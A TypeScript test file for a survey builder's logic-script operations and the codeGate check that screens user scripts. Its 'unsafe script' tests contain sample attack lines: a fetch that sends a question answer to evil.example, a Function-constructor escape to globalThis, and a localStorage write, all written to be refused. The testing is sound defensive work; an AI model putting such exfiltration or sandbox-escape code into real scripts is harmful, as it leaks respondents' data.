import { test } from "node:test";
import assert from "node:assert/strict";
import { SurveyDefinition } from "@rescript/schema";
import { applySurveyActions, coerceSurveyActions, SURVEY_ACTION_OPS, type SurveyAction } from "./surveyActions.js";
import { codeGate } from "./codeGate.js";

/* S2b item 4 (IM-17): Scripts-panel (logic) scripts through the gate */

const base = (() => {
  const empty = SurveyDefinition.parse({ meta: { id: "s", code: "S", title: "x" }, questions: [], flow: [{ type: "end", id: "e", status: "complete" }] });
  return applySurveyActions(empty, [
    { op: "create_block", title: "Main" },
    { op: "create_question", type: "numeric", text: "Spend 1?" },
    { op: "create_question", type: "numeric", text: "Spend 2?" },
    { op: "create_calculation", name: "SPEND_TOTAL", expression: "0" },
  ] as SurveyAction[]).def;
})();
const run = (def: SurveyDefinition, raw: unknown[]) => { const c = coerceSurveyActions(raw); assert.deepEqual(c.rejected, []); return applySurveyActions(def, c.actions); };
const CODE = "var t = 0; for (var i = 1; i <= 2; i++) { t += Number(get('Q' + i) || 0); } setCalc('SPEND_TOTAL', t);";

test("the four ops are in the vocabulary", () => {
  for (const op of ["create_logic_script", "update_logic_script", "remove_logic_script", "set_logic_script_enabled"]) assert.ok((SURVEY_ACTION_OPS as readonly string[]).includes(op), op);
});

test("create: stored in def.scripts with scope/ref resolved by code and the event validated", () => {
  const r = run(base, [{ op: "create_logic_script", name: "Spend total", scope: "question", ref: "Q2", event: "change", code: CODE }]);
  assert.ok(r.results[0].ok, r.results[0].error);
  const s = r.def.scripts[0];
  assert.equal(s.name, "Spend total");
  assert.equal(s.scope, "question");
  assert.equal(s.ref, r.def.questions[1].id, "ref is the question id, resolved from its code");
  assert.equal(s.event, "on_change");
  assert.equal(s.enabled, true);
  assert.match(r.results[0].description, /checked by the logic-script gate, not run yet/);
  // page scope from a question on the page
  const p = run(base, [{ op: "create_logic_script", name: "Page one", scope: "page", ref: "Q1", code: "flag('seen');" }]);
  assert.ok(p.results[0].ok, p.results[0].error);
  assert.ok(p.def.scripts[0].ref && p.def.scripts[0].ref !== p.def.questions[0].id);
  // a bad event is refused at the gate
  const bad = coerceSurveyActions([{ op: "create_logic_script", name: "x", event: "on_hover", code: "flag('a');" }]);
  assert.match(String(bad.rejected[0]?.reason), /the event is one of on_load, on_change/);
});

test("an unsafe script is refused by codeGate(logic) and never stored", () => {
  for (const code of ["fetch('https://evil.example/?a=' + get('Q1'));", "(()=>{}).constructor('return globalThis')().fetch('x');", "localStorage.setItem('a', get('Q1'));"]) {
    assert.equal(codeGate(code, "logic").ok, false, code);
    const r = run(base, [{ op: "create_logic_script", name: "Bad", code }]);
    assert.equal(r.results[0].ok, false, code);
    assert.match(r.results[0].error ?? "", /refused by the logic-script check/);
    assert.equal((r.def.scripts ?? []).length, 0);
  }
});

test("update with edits round-trips; edits that make it unsafe are refused; enable/disable; remove", () => {
  const made = run(base, [{ op: "create_logic_script", name: "Spend total", event: "on_change", code: CODE }]).def;
  const ed = run(made, [{ op: "update_logic_script", script: "spend total", edits: [{ find: "i <= 2", replace: "i <= 3" }] }]);
  assert.ok(ed.results[0].ok, ed.results[0].error);
  assert.ok(ed.def.scripts[0].code.includes("i <= 3"));
  assert.match(ed.results[0].description, /1 edit to its code/);
  const unsafe = run(made, [{ op: "update_logic_script", script: "Spend total", edits: [{ find: "setCalc('SPEND_TOTAL', t);", replace: "fetch('https://x.example/' + t);" }] }]);
  assert.equal(unsafe.results[0].ok, false);
  assert.match(unsafe.results[0].error ?? "", /refused by the logic-script check/);
  const missing = run(made, [{ op: "update_logic_script", script: "Spend total", edits: [{ find: "nope", replace: "x" }] }]);
  assert.match(missing.results[0].error ?? "", /is not in the script/);
  const off = run(made, [{ op: "set_logic_script_enabled", script: "Spend total", enabled: false }]);
  assert.ok(off.results[0].ok);
  assert.equal(off.def.scripts[0].enabled, false);
  assert.ok(off.destructive.length >= 1);
  const rm = run(made, [{ op: "remove_logic_script", script: made.scripts[0].id }]);
  assert.ok(rm.results[0].ok);
  assert.equal(rm.def.scripts.length, 0);
  const none = run(made, [{ op: "remove_logic_script", script: "Other" }]);
  assert.match(none.results[0].error ?? "", /there is no logic script “Other” \(scripts: “Spend total”\)/);
  const dup = run(made, [{ op: "create_logic_script", name: "Spend Total", code: "flag('a');" }]);
  assert.match(dup.results[0].error ?? "", /already a logic script/);
});

test("the guide's example passes the gate", () => {
  assert.equal(codeGate("var t = 0; for (var i = 1; i <= 5; i++) { t += Number(get('SPEND_' + i) || 0); } setCalc('SPEND_TOTAL', t);", "logic").ok, true);
});
